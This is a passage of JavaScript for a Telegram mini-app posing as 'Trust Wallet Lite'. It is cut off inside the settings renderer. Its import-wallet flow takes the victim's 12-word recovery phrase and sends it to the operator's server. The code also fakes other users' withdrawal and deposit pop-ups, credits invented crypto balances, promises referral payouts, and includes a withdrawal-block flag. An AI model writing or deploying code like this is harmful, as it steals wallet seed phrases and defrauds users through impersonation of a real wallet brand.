// ============================================================================
// TRUST WALLET LITE - ULTIMATE PROFESSIONAL VERSION 5.0 (FULLY WORKING)
// ============================================================================

// ====== 1. TELEGRAM WEBAPP INITIALIZATION ======
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
    tg.enableClosingConfirmation?.();
    console.log("✅ Telegram WebApp initialized");
}

const startParam = tg?.initDataUnsafe?.start_param || 
                   new URLSearchParams(window.location.search).get('startapp') || 
                   new URLSearchParams(window.location.search).get('ref');

// ====== 2. STATE MANAGEMENT ======
let userData = null;
let isAdmin = false;
let currentLanguage = localStorage.getItem('language') || 'en';
let currentTheme = localStorage.getItem('theme') || 'light';
let currentPage = 'wallet';
let TWT_PRICE = 1.25;
let livePrices = {};
let unreadNotifications = 0;
let appInitialized = false;

// Cache timers
let lastUserLoadTime = 0;
let lastPricesLoadTime = 0;
let lastHistoryCheckTime = 0;
const USER_CACHE_TIME = 300000;
const PRICES_CACHE_TIME = 10800000;
const HISTORY_CACHE_TIME = 600000;

// ====== 3. CONSTANTS ======
const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
const AIRDROP_BONUS = 10;
const REFERRAL_BONUS = 25;
const SWAP_FEE_PERCENT = 0.003;

const ALL_ASSETS = [
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'USDT', name: 'Tether' },
    { symbol: 'BNB', name: 'BNB' },
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' },
    { symbol: 'ADA', name: 'Cardano' },
    { symbol: 'DOGE', name: 'Dogecoin' },
    { symbol: 'SHIB', name: 'Shiba Inu' },
    { symbol: 'PEPE', name: 'Pepe' },
    { symbol: 'TON', name: 'Toncoin' }
];

const AIRDROP_MILESTONES = [
    { invites: 5, reward: 25, unit: 'USDT', icon: 'fa-star' },
    { invites: 10, reward: 50, unit: 'USDT', icon: 'fa-medal' },
    { invites: 25, reward: 120, unit: 'USDT', icon: 'fa-medal' },
    { invites: 50, reward: 250, unit: 'USDT', icon: 'fa-crown' },
    { invites: 100, reward: 500, unit: 'USDT', icon: 'fa-crown' },
    { invites: 250, reward: 1000, unit: 'USDT', icon: 'fa-gem' },
    { invites: 500, reward: 2500, unit: 'USDT', icon: 'fa-gem' },
    { invites: 1000, reward: 5000, unit: 'USDT', icon: 'fa-diamond' }
];

const WITHDRAW_FEES = {
    TWT: 1, USDT: 0.16, BNB: 0.0005, BTC: 0.0002, ETH: 0.001,
    SOL: 0.005, TRX: 1, ADA: 0.5, DOGE: 1, SHIB: 50000, PEPE: 500000, TON: 0.1
};

const WITHDRAW_MINIMUMS = {
    TWT: 10, USDT: 10, BNB: 0.02, BTC: 0.0005, ETH: 0.005,
    SOL: 0.12, TRX: 40, ADA: 10, DOGE: 50, SHIB: 500000, PEPE: 5000000, TON: 1
};

const CMC_ICONS = {
    TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
    BNB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
    BTC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
    ETH: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
    SOL: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
    TRX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png',
    ADA: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2010.png',
    DOGE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/74.png',
    SHIB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5994.png',
    PEPE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/24478.png',
    TON: 'https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png'
};

const CRYPTO_IDS = {
    TWT: 'trust-wallet-token', USDT: 'tether', BNB: 'binancecoin',
    BTC: 'bitcoin', ETH: 'ethereum', SOL: 'solana', TRX: 'tron',
    ADA: 'cardano', DOGE: 'dogecoin', SHIB: 'shiba-inu',
    PEPE: 'pepe', TON: 'the-open-network'
};

const WELCOME_STICKERS = ['🤝', '🫣', '🥰', '🥳', '💲', '💰', '💸', '💵', '🤪', '😱', '😤', '😎', '🤑', '💯', '💖', '✨', '🌟', '⭐', '🔥', '⚡', '💎', '🔔', '🎁', '🎈', '🎉', '🎊', '👑', '🚀', '💫'];

let notificationTimeouts = [];
const FLOATING_NOTIFICATIONS = [
    "💸 Withdrawal • 0x3f...a2d1 • 12 USDT",
    "💰 Deposit • 0x8b...c4e9 • 150 USDT",
    "🔄 Swap • 500 TWT → 625 USDT",
    "🎉 Referral • New user joined! +25 USDT"
];

// ====== 4. TRANSLATIONS ======
const translations = {
    en: {
        'nav.wallet': 'Wallet', 'nav.airdrop': 'Airdrop',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'Settings',
        'actions.send': 'Send', 'actions.receive': 'Receive', 
        'actions.swap': 'Swap', 'actions.history': 'History',
        'actions.deposit': 'Deposit', 'actions.withdraw': 'Withdraw',
        'wallet.totalBalance': 'Total Balance',
        'swap.from': 'From', 'swap.to': 'To', 'swap.confirm': 'Confirm Swap',
        'airdrop.totalInvites': 'Total Invites', 'airdrop.earned': 'USDT Earned',
        'airdrop.yourLink': 'Your Invite Link', 'airdrop.milestones': 'Airdrop Milestones',
        'airdrop.inviteBonus': 'Get 25 USDT for each friend who joins!',
        'card.balance': 'Card Balance', 'settings.language': 'Language',
        'settings.theme': 'Theme', 'settings.logout': 'Logout',
        'settings.backup': 'Backup Wallet', 'coming.soon': 'Coming Soon',
        'notifications.title': 'Notifications'
    },
    ar: {
        'nav.wallet': 'المحفظة', 'nav.airdrop': 'الإسقاط الجوي',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'الإعدادات',
        'actions.send': 'إرسال', 'actions.receive': 'استلام',
        'actions.swap': 'تحويل', 'actions.history': 'السجل',
        'actions.deposit': 'إيداع', 'actions.withdraw': 'سحب',
        'wallet.totalBalance': 'الرصيد الإجمالي',
        'swap.from': 'من', 'swap.to': 'إلى', 'swap.confirm': 'تأكيد',
        'airdrop.totalInvites': 'إجمالي الدعوات', 'airdrop.earned': 'USDT المكتسبة',
        'airdrop.yourLink': 'رابط الدعوة', 'airdrop.milestones': 'مراحل الإسقاط',
        'airdrop.inviteBonus': 'احصل على 25 USDT لكل صديق ينضم!',
        'card.balance': 'رصيد البطاقة', 'settings.language': 'اللغة',
        'settings.theme': 'المظهر', 'settings.logout': 'تسجيل الخروج',
        'settings.backup': 'نسخ احتياطي', 'coming.soon': 'قريباً',
        'notifications.title': 'الإشعارات'
    }
};

// ====== 5. UTILITY FUNCTIONS ======
function t(key, params = {}) {
    let text = translations[currentLanguage]?.[key] || translations.en[key] || key;
    Object.keys(params).forEach(param => {
        text = text.replace(`{${param}}`, params[param]);
    });
    return text;
}

function getCurrencyIcon(symbol) {
    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
}

function formatBalance(balance, symbol) {
    if (symbol === 'TWT') return balance.toLocaleString() + ' TWT';
    if (symbol === 'USDT') return '$' + balance.toFixed(2);
    if (symbol === 'BTC') return balance.toFixed(6) + ' BTC';
    if (['BNB', 'ETH', 'SOL', 'TRX', 'ADA', 'TON'].includes(symbol)) return balance.toFixed(4) + ' ' + symbol;
    return balance.toLocaleString() + ' ' + symbol;
}

function formatNumber(num) {
    if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
    if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
    if (num < 0.0001) return num.toFixed(8);
    if (num < 0.01) return num.toFixed(6);
    return num.toFixed(2);
}

function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');
    if (!toast) return;
    toastMessage.textContent = message;
    toast.classList.remove('hidden');
    const icon = toast.querySelector('i');
    if (icon) {
        if (type === 'success') icon.className = 'fa-regular fa-circle-check';
        else if (type === 'error') icon.className = 'fa-regular fa-circle-xmark';
        else icon.className = 'fa-regular fa-circle-info';
    }
    setTimeout(() => toast.classList.add('hidden'), 3000);
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) modal.classList.remove('show');
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    showToast('Copied!');
}

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ====== 6. THEME & LANGUAGE ======
function toggleLanguage() {
    currentLanguage = currentLanguage === 'en' ? 'ar' : 'en';
    localStorage.setItem('language', currentLanguage);
    const flagEl = document.getElementById('currentLanguageFlag');
    if (flagEl) flagEl.textContent = currentLanguage === 'en' ? '🇬🇧' : '🇸🇦';
    if (currentLanguage === 'ar') {
        document.body.classList.add('rtl');
        document.documentElement.dir = 'rtl';
    } else {
        document.body.classList.remove('rtl');
        document.documentElement.dir = 'ltr';
    }
    updateUITexts();
    if (currentPage === 'settings') renderSettings();
    if (currentPage === 'airdrop') renderAirdrop();
    showToast('Language changed', 'success');
}

function toggleTheme() {
    currentTheme = currentTheme === 'light' ? 'dark' : 'light';
    localStorage.setItem('theme', currentTheme);
    document.documentElement.setAttribute('data-theme', currentTheme);
    const themeIcon = document.querySelector('#themeBtn i');
    if (themeIcon) themeIcon.className = currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
    showToast(`${currentTheme === 'dark' ? 'Dark' : 'Light'} mode`, 'success');
}

function initTheme() {
    document.documentElement.setAttribute('data-theme', currentTheme);
    const themeIcon = document.querySelector('#themeBtn i');
    if (themeIcon) themeIcon.className = currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
}

function updateUITexts() {
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        el.textContent = t(key);
    });
}

// ====== 7. STICKER SYSTEM ======
let lastStickerTime = 0;
const STICKER_COOLDOWN = 12 * 60 * 1000;

function showRandomSticker() {
    const now = Date.now();
    if (now - lastStickerTime < STICKER_COOLDOWN) return;
    const stickerElement = document.getElementById('welcomeSticker');
    if (!stickerElement) return;
    const randomSticker = WELCOME_STICKERS[Math.floor(Math.random() * WELCOME_STICKERS.length)];
    stickerElement.textContent = randomSticker;
    stickerElement.classList.remove('sticker-pop', 'sticker-shake');
    void stickerElement.offsetWidth;
    stickerElement.classList.add('sticker-pop');
    setTimeout(() => stickerElement.classList.add('sticker-shake'), 200);
    setTimeout(() => {
        stickerElement.classList.remove('sticker-pop', 'sticker-shake');
        setTimeout(() => stickerElement.textContent = '', 300);
    }, 3000);
    lastStickerTime = now;
}

// ====== 8. FLOATING NOTIFICATIONS ======
function initFloatingNotifications() {
    startFloatingNotifications();
}

function startFloatingNotifications() {
    const schedules = [16000, 24000, 90000, 260000, 20000, 30000];
    let scheduleIndex = 0;
    
    function showNextNotification() {
        const randomIndex = Math.floor(Math.random() * FLOATING_NOTIFICATIONS.length);
        showFloatingToast(FLOATING_NOTIFICATIONS[randomIndex]);
        const nextDelay = schedules[scheduleIndex % schedules.length];
        scheduleIndex++;
        notificationTimeouts.push(setTimeout(showNextNotification, nextDelay));
    }
    
    setTimeout(showNextNotification, 3000);
}

function showFloatingToast(message) {
    let toast = document.getElementById('floatingToast');
    if (!toast) {
        toast = document.createElement('div');
        toast.id = 'floatingToast';
        toast.className = 'floating-toast';
        document.body.appendChild(toast);
    }
    toast.textContent = message;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 5000);
}

// ====== 9. API CALLS ======
async function apiCall(endpoint, method = 'GET', body = null) {
    const options = { method, headers: { 'Content-Type': 'application/json' } };
    if (body) options.body = JSON.stringify(body);
    const response = await fetch(`/api${endpoint}`, options);
    return response.json();
}

async function createUser(userId, userData) {
    return apiCall('/users', 'POST', { userId, userData });
}

async function getUser(userId) {
    return apiCall(`/users/${userId}`);
}

async function updateUser(userId, updates) {
    return apiCall(`/users/${userId}`, 'PATCH', { updates });
}

async function processReferral(referrerId, newUserId) {
    return apiCall('/referrals', 'POST', { referrerId, newUserId });
}

async function createDepositAddress(userId, currency) {
    return apiCall('/deposit-address', 'POST', { userId, currency });
}

// ====== 10. PRICES ======
async function fetchLivePrices(force = false) {
    const now = Date.now();
    const cachedPrices = localStorage.getItem('live_prices');
    
    if (!force && cachedPrices && (now - lastPricesLoadTime) < PRICES_CACHE_TIME) {
        const { prices, timestamp } = JSON.parse(cachedPrices);
        livePrices = prices;
        lastPricesLoadTime = timestamp;
        updatePrices();
        return;
    }
    
    try {
        const ids = Object.values(CRYPTO_IDS).join(',');
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);
        const data = await response.json();
        
        for (const [symbol, id] of Object.entries(CRYPTO_IDS)) {
            if (data[id]) {
                livePrices[symbol] = { price: data[id].usd, change: data[id].usd_24h_change || 0 };
            }
        }
        if (!livePrices.TWT) livePrices.TWT = { price: 1.25, change: 0 };
        TWT_PRICE = livePrices.TWT.price;
        
        lastPricesLoadTime = now;
        localStorage.setItem('live_prices', JSON.stringify({ prices: livePrices, timestamp: now }));
        updatePrices();
    } catch (error) {
        console.error("Price fetch error:", error);
    }
}

function updatePrices() {
    if (currentPage === 'wallet') renderAssets();
    updateTotalBalance();
}

function refreshPrices() {
    fetchLivePrices(true);
    showToast('Prices refreshed!', 'success');
}

// ====== 11. USER DATA MANAGEMENT ======
function getUserId() {
    return localStorage.getItem('twt_user_id') || null;
}

async function loadUserData(force = false) {
    try {
        const now = Date.now();
        const localData = localStorage.getItem(`user_${getUserId()}`);
        
        if (!force && localData && (now - lastUserLoadTime) < USER_CACHE_TIME) {
            userData = JSON.parse(localData);
            updateUI();
            updateNotificationBadge();
            checkAdminAndAddCrown();
            return;
        }
        
        if (db && getUserId()) {
            const result = await getUser(getUserId());
            if (result.success && result.data) {
                userData = result.data;
                localStorage.setItem(`user_${getUserId()}`, JSON.stringify(userData));
                lastUserLoadTime = now;
            }
        }
        
        updateUI();
        updateNotificationBadge();
        checkAdminAndAddCrown();
    } catch (error) {
        console.error("Error loading user data:", error);
    }
}

function saveUserData() {
    if (userData) {
        localStorage.setItem(`user_${userData.userId}`, JSON.stringify(userData));
        updateUser(userData.userId, userData);
    }
}

function updateTotalBalance() {
    if (!userData) return;
    let total = userData.balances.USDT || 0;
    total += (userData.balances.TWT || 0) * TWT_PRICE;
    total += (userData.balances.BNB || 0) * (livePrices.BNB?.price || 580);
    total += (userData.balances.BTC || 0) * (livePrices.BTC?.price || 65000);
    total += (userData.balances.ETH || 0) * (livePrices.ETH?.price || 3400);
    total += (userData.balances.SOL || 0) * (livePrices.SOL?.price || 150);
    total += (userData.balances.TRX || 0) * (livePrices.TRX?.price || 0.25);
    total += (userData.balances.ADA || 0) * (livePrices.ADA?.price || 0.45);
    total += (userData.balances.DOGE || 0) * (livePrices.DOGE?.price || 0.15);
    total += (userData.balances.SHIB || 0) * (livePrices.SHIB?.price || 0.000025);
    total += (userData.balances.PEPE || 0) * (livePrices.PEPE?.price || 0.000015);
    total += (userData.balances.TON || 0) * (livePrices.TON?.price || 5.50);
    
    const totalElement = document.getElementById('totalBalance');
    if (totalElement) totalElement.textContent = '$' + total.toFixed(2);
}

function updateUI() {
    if (currentPage === 'wallet') {
        renderAssets();
        updateTotalBalance();
    }
    if (currentPage === 'airdrop') {
        updateAirdropStats();
        renderAirdropMilestones();
    }
    if (currentPage === 'twtpay') renderTWTPay();
    if (currentPage === 'settings') renderSettings();
    updateNotificationBadge();
}

function updateNotificationBadge() {
    const badge = document.querySelector('.badge');
    if (badge && userData) {
        unreadNotifications = userData.notifications?.filter(n => !n.read).length || 0;
        badge.textContent = unreadNotifications;
        badge.style.display = unreadNotifications > 0 ? 'block' : 'none';
    }
}

function addNotification(message, type = 'info') {
    if (!userData) return;
    const notification = {
        id: Date.now().toString(),
        message: message,
        type: type,
        read: false,
        timestamp: new Date().toISOString()
    };
    if (!userData.notifications) userData.notifications = [];
    userData.notifications.unshift(notification);
    saveUserData();
    updateNotificationBadge();
}

function showNotifications() {
    const modal = document.getElementById('notificationsModal');
    const list = document.getElementById('notificationsList');
    if (!modal || !list || !userData) return;
    
    const notifications = userData.notifications || [];
    if (notifications.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:40px;">📭 No notifications</div>';
    } else {
        list.innerHTML = notifications.map(n => `
            <div class="notification-item" style="padding:12px;border-bottom:1px solid var(--border);cursor:pointer;" onclick="markNotificationRead('${n.id}')">
                <div class="notification-message" style="${n.read ? 'opacity:0.7;' : 'font-weight:bold;'}">${n.message}</div>
                <div class="notification-time" style="font-size:10px;color:var(--text-muted);margin-top:4px;">${new Date(n.timestamp).toLocaleString()}</div>
            </div>
        `).join('');
    }
    modal.classList.add('show');
}

function markNotificationRead(id) {
    const notif = userData.notifications.find(n => n.id === id);
    if (notif && !notif.read) {
        notif.read = true;
        saveUserData();
        updateNotificationBadge();
        showNotifications();
    }
}

// ====== 12. ONBOARDING & WALLET CREATION ======
function showMainApp() {
    document.getElementById('onboardingScreen').style.display = 'none';
    document.getElementById('mainContent').style.display = 'block';
    showWallet();
    showRandomSticker();
}

function showOnboarding() {
    document.getElementById('onboardingScreen').style.display = 'flex';
    document.getElementById('mainContent').style.display = 'none';
}

async function createNewWallet() {
    const btn = document.getElementById('createWalletBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    btn.disabled = true;
    
    try {
        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('twt_user_id', newUserId);
        
        const newUserData = {
            userId: newUserId,
            userName: 'User',
            referralCode: newUserId.slice(-8).toUpperCase(),
            balances: {
                TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0.5, BTC: 0.01, ETH: 0.1,
                SOL: 5, TRX: 100, ADA: 50, DOGE: 200, SHIB: 1000000,
                PEPE: 5000000, TON: 2
            },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            airdropMilestones: AIRDROP_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [{ id: Date.now(), message: '🎉 Welcome! You got 10 USDT Airdrop!', read: false, timestamp: new Date() }],
            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT', timestamp: new Date() }],
            depositAddresses: {},
            withdrawBlocked: false,
            createdAt: new Date().toISOString(),
            recoveryPhrase: ['apple', 'banana', 'cherry', 'dragon', 'eagle', 'forest', 'green', 'happy', 'island', 'jungle', 'king', 'light'].join(' ')
        };
        
        await createUser(newUserId, newUserData);
        userData = newUserData;
        saveUserData();
        
        if (startParam) {
            await processReferral(startParam, newUserId);
        }
        
        showMainApp();
        updateUI();
        checkAdminAndAddCrown();
        showToast('✅ Wallet created! +10 USDT');
    } catch (error) {
        showToast('Failed to create wallet', 'error');
    } finally {
        btn.innerHTML = 'Create a new wallet';
        btn.disabled = false;
    }
}

function showImportModal() {
    const grid = document.getElementById('wordsGrid');
    grid.innerHTML = '';
    for (let i = 1; i <= 12; i++) {
        grid.innerHTML += `<div class="word-field"><div class="word-label">${i}</div><input type="text" id="word_${i}" class="word-input" placeholder="word ${i}"></div>`;
    }
    document.getElementById('importModal').classList.add('show');
}

async function importWallet() {
    const words = [];
    for (let i = 1; i <= 12; i++) {
        const word = document.getElementById(`word_${i}`)?.value.trim();
        if (!word) { showToast(`Enter word ${i}`, 'error'); return; }
        words.push(word);
    }
    
    const btn = document.getElementById('confirmImportBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
    btn.disabled = true;
    
    try {
        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('twt_user_id', newUserId);
        
        const newUserData = {
            userId: newUserId,
            userName: 'User',
            recoveryPhrase: words.join(' '),
            referralCode: newUserId.slice(-8).toUpperCase(),
            balances: {
                TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0.5, BTC: 0.01, ETH: 0.1,
                SOL: 5, TRX: 100, ADA: 50, DOGE: 200, SHIB: 1000000,
                PEPE: 5000000, TON: 2
            },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            airdropMilestones: AIRDROP_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [{ id: Date.now(), message: '🎉 Wallet imported! You got 10 USDT!', read: false, timestamp: new Date() }],
            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT', timestamp: new Date() }],
            depositAddresses: {},
            withdrawBlocked: false,
            createdAt: new Date().toISOString()
        };
        
        await createUser(newUserId, newUserData);
        userData = newUserData;
        saveUserData();
        
        if (startParam) {
            await processReferral(startParam, newUserId);
        }
        
        closeModal('importModal');
        showMainApp();
        updateUI();
        checkAdminAndAddCrown();
        showToast('✅ Wallet imported! +10 USDT');
    } catch (error) {
        showToast('Failed to import wallet', 'error');
    } finally {
        btn.innerHTML = 'Import Wallet';
        btn.disabled = false;
    }
}

function checkAdminAndAddCrown() {
    const crownBtn = document.getElementById('adminCrownBtn');
    if (crownBtn) {
        if (isAdmin) crownBtn.classList.remove('hidden');
        else crownBtn.classList.add('hidden');
    }
}

// ====== 13. RENDER WALLET ======
function renderAssets() {
    const container = document.getElementById('assetsList');
    if (!container) return;
    
    // إذا لم يكن userData موجوداً، عرض رسالة
    if (!userData) {
        container.innerHTML = '<div style="text-align:center;padding:40px;">Loading assets...</div>';
        return;
    }
    
    container.innerHTML = ALL_ASSETS.map(asset => {
        const balance = userData.balances[asset.symbol] || 0;
        const price = livePrices[asset.symbol]?.price || (asset.symbol === 'TWT' ? TWT_PRICE : 0);
        const value = asset.symbol === 'USDT' ? balance : balance * price;
        const change = livePrices[asset.symbol]?.change || 0;
        const changeClass = change >= 0 ? 'positive' : 'negative';
        const changeSymbol = change >= 0 ? '+' : '';
        
        return `
            <div class="asset-item">
                <div class="asset-left">
                    <img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img">
                    <div class="asset-info">
                        <h4>${asset.name}</h4>
                        <p>${asset.symbol} <span class="asset-change ${changeClass}">${changeSymbol}${change.toFixed(2)}%</span></p>
                    </div>
                </div>
                <div class="asset-right">
                    <div class="asset-balance">${formatBalance(balance, asset.symbol)}</div>
                    <div class="asset-value">$${formatNumber(value)}</div>
                </div>
            </div>
        `;
    }).join('');
}

function renderWallet() {
    const container = document.getElementById('walletContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="balance-card">
            <div class="total-balance" id="totalBalance">$0</div>
            <div class="balance-change"><i class="fas fa-arrow-up"></i><span>+2.5% from last week</span></div>
        </div>
        <div class="action-buttons">
            <button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>${t('actions.send')}</span></button>
            <button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>${t('actions.receive')}</span></button>
            <button class="action-btn" onclick="showSwapModal()"><i class="fas fa-exchange-alt"></i><span>${t('actions.swap')}</span></button>
            <button class="action-btn" onclick="showHistory()"><i class="fas fa-history"></i><span>${t('actions.history')}</span></button>
        </div>
        <div id="assetsList" class="assets-list"></div>
    `;
    renderAssets();
    updateTotalBalance();
}

// ====== 14. RENDER AIRDROP (محتوى فعلي) ======
function renderAirdrop() {
    const container = document.getElementById('referralContainer');
    if (!container) return;
    
    // إذا لم يكن userData موجوداً، عرض رسالة
    if (!userData) {
        container.innerHTML = '<div style="text-align:center;padding:40px;">Loading airdrop data...</div>';
        return;
    }
    
    const inviteLink = `${BOT_LINK}?startapp=${userData.referralCode}`;
    
    container.innerHTML = `
        <div class="referral-stats">
            <div class="stat-card">
                <span class="stat-label">${t('airdrop.totalInvites')}</span>
                <span class="stat-value" id="totalInvites">${userData.inviteCount || 0}</span>
            </div>
            <div class="stat-card">
                <span class="stat-label">${t('airdrop.earned')}</span>
                <span class="stat-value" id="usdtEarned">${(userData.totalUsdtEarned || 0).toFixed(2)}</span>
            </div>
        </div>
        <div class="referral-link-card">
            <div class="link-label">${t('airdrop.yourLink')}</div>
            <div class="link-container">
                <input type="text" id="inviteLink" value="${inviteLink}" readonly>
                <button class="copy-btn" onclick="copyInviteLink()"><i class="fa-regular fa-copy"></i></button>
                <button class="share-btn" onclick="shareInvite()"><i class="fa-regular fa-share-from-square"></i></button>
            </div>
        </div>
        <div class="referral-description">
            <i class="fa-regular fa-gift"></i>
            <p>${t('airdrop.inviteBonus')}</p>
        </div>
        <div class="section-header"><h3>${t('airdrop.milestones')}</h3></div>
        <div class="milestones-list" id="milestonesList"></div>
    `;
    
    renderAirdropMilestones();
}

function renderAirdropMilestones() {
    const container = document.getElementById('milestonesList');
    if (!container || !userData) return;
    
    container.innerHTML = AIRDROP_MILESTONES.map(m => {
        const progress = Math.min((userData.inviteCount / m.invites) * 100, 100);
        const canClaim = userData.inviteCount >= m.invites && !userData.airdropMilestones.find(x => x.invites === m.invites)?.claimed;
        const isClaimed = userData.airdropMilestones.find(x => x.invites === m.invites)?.claimed;
        
        return `
            <div class="milestone-item">
                <div class="milestone-header">
                    <span class="milestone-referrals"><i class="fa-regular ${m.icon}"></i> ${m.invites} Invites</span>
                    <span class="milestone-reward">${m.reward} ${m.unit}</span>
                </div>
                <div class="milestone-progress">
                    <div class="progress-bar"><div class="progress-fill" style="width: ${progress}%"></div></div>
                    <span class="progress-text">${userData.inviteCount}/${m.invites}</span>
                </div>
                ${canClaim ? `<button class="claim-btn" onclick="claimMilestone(${m.invites})">Claim Reward</button>` : isClaimed ? '<p style="color: var(--success); text-align: center;">✓ Claimed</p>' : ''}
            </div>
        `;
    }).join('');
}

async function claimMilestone(invites) {
    const m = userData.airdropMilestones.find(x => x.invites === invites);
    if (!m || m.claimed) return;
    if (userData.inviteCount < invites) {
        showToast(`Need ${invites} invites`, 'error');
        return;
    }
    
    const reward = AIRDROP_MILESTONES.find(x => x.invites === invites).reward;
    userData.balances.USDT = (userData.balances.USDT || 0) + reward;
    userData.totalUsdtEarned = (userData.totalUsdtEarned || 0) + reward;
    m.claimed = true;
    
    addTransaction({ type: 'milestone', amount: reward, currency: 'USDT', details: `Milestone: ${invites} invites` });
    saveUserData();
    updateUI();
    showToast(`Claimed ${reward} USDT!`);
}

function copyInviteLink() {
    copyToClipboard(`${BOT_LINK}?startapp=${userData?.referralCode}`);
    showToast('Referral link copied!');
}

function shareInvite() {
    const text = `🚀 Join Trust Wallet Lite and get ${AIRDROP_BONUS} USDT Airdrop! Use my link: ${BOT_LINK}?startapp=${userData?.referralCode}`;
    if (tg?.shareToStory) tg.shareToStory(text);
    else copyToClipboard(text);
    showToast('Link copied!');
}

// ====== 15. RENDER TWT PAY ======
function renderTWTPay() {
    const container = document.getElementById('twtpayContainer');
    if (!container) return;
    
    // إذا لم يكن userData موجوداً، عرض بطاقة تجريبية
    const twtBalance = userData?.balances?.TWT || 0;
    const twtValue = twtBalance * TWT_PRICE;
    const cardNumber = userData?.userId?.slice(-4) || '8888';
    const cardHolder = userData?.userName || 'TWT User';
    
    container.innerHTML = `
        <div class="virtual-card">
            <div class="card-chip"><i class="fas fa-microchip"></i></div>
            <div class="card-brand">TWT Pay</div>
            <div class="card-number">
                <span>****</span>
                <span>****</span>
                <span>****</span>
                <span>${cardNumber}</span>
            </div>
            <div class="card-details">
                <div>
                    <div class="label">Card Holder</div>
                    <div class="value">${cardHolder}</div>
                </div>
                <div>
                    <div class="label">Expires</div>
                    <div class="value">12/28</div>
                </div>
            </div>
            <div class="card-balance">
                <div class="balance-label">${t('card.balance')}</div>
                <div class="balance-value">${twtBalance.toLocaleString()} TWT</div>
                <div class="balance-usd">≈ $${twtValue.toFixed(2)} USD</div>
            </div>
            <div class="card-footer">
                <i class="fab fa-visa"></i>
                <span>Virtual Card</span>
            </div>
        </div>
        <div class="card-actions">
            <button class="card-action-btn" onclick="showTopUp()">
                <i class="fas fa-plus-circle"></i>
                <span>Top Up</span>
            </button>
            <button class="card-action-btn" onclick="showCardSettings()">
                <i class="fas fa-sliders-h"></i>
                <span>Settings</span>
            </button>
            <button class="card-action-btn" onclick="showCardTransactions()">
                <i class="fas fa-history"></i>
                <span>History</span>
            </button>
        </div>
        <div class="card-features">
            <div class="feature">
                <i class="fas fa-globe"></i>
                <span>Global</span>
            </div>
            <div class="feature">
                <i class="fas fa-shield-alt"></i>
                <span>Secure</span>
            </div>
            <div class="feature">
                <i class="fas fa-percent"></i>
                <span>2% Cashback</span>
            </div>
            <div class="feature">
                <i class="fas fa-exchange-alt"></i>
                <span>Coming Soon</span>
            </div>
        </div>
    `;
}

function showTopUp() { showToast('Coming soon!', 'info'); }
function showCardSettings() { showToast('Coming soon!', 'info'); }
function showCardTransactions() { showHistory(); }

// ====== 16. RENDER SETTINGS ======
function renderSettings() {
    const container = document.getElementById('settingsContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="settings-list">
            <div class="settings-item" onclick="showNotifications()">
                <i class="fas fa-bell"></i>
                <div>
                    <div class="label">${t('notifications.title')}</div>
                    <div class="desc">View all notifications</div>
                </div>
                <i class="fas fa-chevron-right"></i>
            </div>
            <div class="settings-item" onclick="showHistory()">
                <i class="fas fa-history"></i>
                <div>
                    <div class="label">${t('actions.history')}</div>
                    <div class="desc">View all transactions</div>
                </div>
                <i class="fas fa-chevron-right"></i>
            </div>
            <div class="settings-item" onclick="toggleLanguage()">
                <i class="fas fa-language"></i>
                <div>
                    <div class="label">${t('settings.language')}</div>
                    <div class="desc">${currentLanguage === 'en' ? 'English / العربية' : 'العربية / English'}</div>
                </div>
                <i class="fas fa-chevron-right"></i>
            </div>
            <div class="settings-item" onclick="toggleTheme()">
